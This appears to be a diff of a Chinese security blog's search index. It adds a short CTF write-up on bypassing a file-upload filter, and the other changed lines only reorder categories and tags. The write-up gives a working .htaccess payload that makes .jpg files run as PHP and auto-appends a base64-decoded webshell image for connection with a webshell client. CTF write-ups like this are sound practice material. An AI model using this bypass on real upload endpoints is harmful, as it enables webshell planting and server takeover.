@@ -4,6 +4,19 @@
   
   
   <entry>
+    <title>记录一种文件上传的绕过方法</title>
+    <link href="/2025/12/11/%E8%AE%B0%E5%BD%95%E4%B8%80%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
+    <url>/2025/12/11/%E8%AE%B0%E5%BD%95%E4%B8%80%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
+    
+    <content type="html"><![CDATA[<h1 id="记录一种文件上传的绕过方法"><a href="#记录一种文件上传的绕过方法" class="headerlink" title="记录一种文件上传的绕过方法"></a>记录一种文件上传的绕过方法</h1><p>刷polarctf遇到的一道题目。</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251211191037726-1765451472860-1.png" alt="image-20251211191037726"></p><p>考虑使用 <code>.htaccess</code> 触发解析执行。但是传入的jpg文件不能有<code>&lt;?</code>，使用<code>&lt;script language=&quot;php&quot;&gt;php代码&lt;/script&gt;</code>上传成功后也不能蚁剑连接。原因应该是php7以上的版本，不能这么使用php标签头。</p><p>使用的方法是修改<code>.htaccess</code>配置文件，以用后门读取base64</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.htaccess</span>文件：<br>AddType application/x-httpd-php <span class="hljs-string">.jpg</span><br>php_value auto_append_fi\<br>le <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=shell.jpg&quot;</span><br></code></pre></td></tr></table></figure><p>之后再上传图片码就可以正常连接。</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>[ISITDTU 2019]EasyPHP</title>
     <link href="/2025/11/10/ISITDTU-2019-EasyPHP/"/>
     <url>/2025/11/10/ISITDTU-2019-EasyPHP/</url>
@@ -205,9 +218,9 @@
     
     <categories>
       
-      <category>基础知识</category>
-      
       <category>实操</category>
+      
+      <category>基础知识</category>
       
       <category>Misc</category>
       
@@ -261,18 +274,18 @@
       
       <category>web</category>
       
-      <category>基础知识</category>
-      
       <category>实操</category>
+      
+      <category>基础知识</category>
       
     </categories>
     
     
     <tags>
       
-      <tag>堆叠注入</tag>
-      
       <tag>SQL注入</tag>
+      
+      <tag>堆叠注入</tag>
       
       <tag>报错注入</tag>
       
@@ -300,9 +313,9 @@
       
       <category>web</category>
       
-      <category>基础知识</category>
-      
       <category>实操</category>
+      
+      <category>基础知识</category>
       
     </categories>
     
@@ -329,9 +342,9 @@
       
       <category>web</category>
       
-      <category>基础知识</category>
-      
       <category>实操</category>
+      
+      <category>基础知识</category>
       
     </categories>
     
@@ -358,9 +371,9 @@
       
       <category>web</category>
       
-      <category>基础知识</category>
-      
       <category>实操</category>
+      
+      <category>基础知识</category>
       
     </categories>
     
@@ -468,9 +481,9 @@
     
     <categories>
       
-      <category>基础知识</category>
-      
       <category>实操</category>
+      
+      <category>基础知识</category>
       
       <category>Misc</category>
       
@@ -555,9 +568,9 @@
       
       <category>web</category>
       
-      <category>基础知识</category>
-      
       <category>实操</category>
+      
+      <category>基础知识</category>
       
     </categories>
     
@@ -729,9 +742,9 @@
       
       <category>web</category>
       
-      <category>基础知识</category>
-      
       <category>实操</category>
+      
+      <category>基础知识</category>
       
     </categories>
     
